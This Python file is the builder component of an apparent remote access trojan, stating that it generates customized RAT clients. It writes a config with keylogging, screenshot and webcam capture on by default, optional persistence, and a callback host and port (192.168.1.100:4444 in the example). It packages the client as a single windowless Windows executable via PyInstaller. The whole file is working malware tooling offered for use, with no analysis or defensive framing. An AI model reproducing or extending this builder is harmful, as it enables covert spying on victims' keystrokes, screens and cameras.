#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import json
import time
import base64
import shutil
import logging
import subprocess
from typing import Dict, Any, Optional, Tuple
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend

class ClientBuilder:
    """Client builder for generating customized RAT clients"""
    
    def __init__(self):
        """Initialize the client builder"""
        self.build_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'builds')
        os.makedirs(self.build_dir, exist_ok=True)
        
        # Default configuration
        self.default_config = {
            'server_host': 'localhost',
            'server_port': 8080,
            'encryption_enabled': True,
            'persistence_enabled': False,
            'keylogger_enabled': True,
            'screenshot_enabled': True,
            'webcam_enabled': True,
            'connection_interval': 30,
            'max_retry_interval': 300
        }
    
    def generate_encryption_key(self) -> Tuple[bytes, bytes]:
        """Generate encryption key and salt
        
        Returns:
            Tuple[bytes, bytes]: (key, salt) pair
        """
        salt = os.urandom(16)
        password = base64.b64encode(os.urandom(32)).decode()
        
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
            backend=default_backend()
        )
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        return key, salt
    
    def create_config(self, config: Dict[str, Any]) -> str:
        """Create client configuration
        
        Args:
            config: Configuration options
            
        Returns:
            str: Path to config file
        """
        # Merge with default config
        final_config = self.default_config.copy()
        final_config.update(config)
        
        # Generate encryption key if enabled
        if final_config['encryption_enabled']:
            key, salt = self.generate_encryption_key()
            final_config['encryption_key'] = key.decode()
            final_config['encryption_salt'] = base64.b64encode(salt).decode()
        
        # Save config
        config_path = os.path.join(self.build_dir, 'config.json')
        with open(config_path, 'w') as f:
            json.dump(final_config, f, indent=4)
        
        return config_path
    
    def build_client(self, config: Dict[str, Any], output_name: Optional[str] = None) -> Optional[str]:
        """Build client executable
        
        Args:
            config: Client configuration
            output_name: Name for output file
            
        Returns:
            str: Path to built executable or None if failed
        """
        try:
            # Create config file
            config_path = self.create_config(config)
            
            # Set output name
            if not output_name:
                output_name = f'client_{datetime.now().strftime("%Y%m%d_%H%M%S")}.exe'
            elif not output_name.endswith('.exe'):
                output_name += '.exe'
            
            output_path = os.path.join(self.build_dir, output_name)
            
            # Copy client source
            build_src = os.path.join(self.build_dir, 'src')
            os.makedirs(build_src, exist_ok=True)
            
            client_dir = os.path.dirname(os.path.abspath(__file__))
            source_files = ['main.py']  # Add other necessary source files here
            
            for item in source_files:
                src = os.path.join(client_dir, item)
                dst = os.path.join(build_src, item)
                if os.path.exists(src):
                    shutil.copy2(src, dst)
                else:
                    logging.error(f"Source file not found: {src}")
                    return None
            
            # Build executable with PyInstaller
            pyinstaller_cmd = [
                'pyinstaller',
                '--onefile',
                '--noconsole',
                '--hidden-import=pynput.keyboard._win32',
                '--hidden-import=pynput.mouse._win32',
                '--add-data', f'{config_path}{os.pathsep}.',
                '-n', os.path.splitext(output_name)[0],  # Name without .exe
                os.path.join(build_src, 'main.py')
            ]
            
            subprocess.run(pyinstaller_cmd, check=True)
            
            # Move executable to builds directory
            built_exe = os.path.join('dist', os.path.splitext(output_name)[0] + '.exe')
            if os.path.exists(built_exe):
                shutil.move(built_exe, output_path)
            else:
                logging.error("Built executable not found")
                return None
            
            # Cleanup
            for dir_name in ['build', 'dist', build_src]:
                shutil.rmtree(dir_name, ignore_errors=True)
            for file_ext in ['spec']:
                try:
                    os.remove(f"{os.path.splitext(output_name)[0]}.{file_ext}")
                except OSError:
                    pass
            
            return output_path
        
        except subprocess.CalledProcessError as e:
            logging.error(f"PyInstaller failed: {str(e)}")
            return None
        except Exception as e:
            logging.error(f"Error building client: {str(e)}")
            return None
    
    def cleanup_old_builds(self, max_age_days: int = 7) -> None:
        """Remove old builds
        
        Args:
            max_age_days: Maximum age of files to keep
        """
        try:
            current_time = time.time()
            for filename in os.listdir(self.build_dir):
                filepath = os.path.join(self.build_dir, filename)
                if os.path.isfile(filepath):
                    file_age = current_time - os.path.getmtime(filepath)
                    if file_age > (max_age_days * 86400):  # Convert days to seconds
                        try:
                            os.remove(filepath)
                            logging.info(f"Removed old build: {filename}")
                        except OSError as e:
                            logging.error(f"Error removing {filename}: {str(e)}")
        except Exception as e:
            logging.error(f"Error cleaning up builds: {str(e)}")

if __name__ == "__main__":
    # Configure logging
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )
    
    # Example usage
    builder = ClientBuilder()
    
    custom_config = {
        'server_host': '192.168.1.100',
        'server_port': 4444,
        'persistence_enabled': True
    }
    
    output_file = builder.build_client(custom_config, "test_client.exe")
    if output_file:
        logging.info(f"Client built successfully: {output_file}")
    else:
        logging.error("Client build failed")
    
    # Cleanup old builds
    builder.cleanup_old_builds()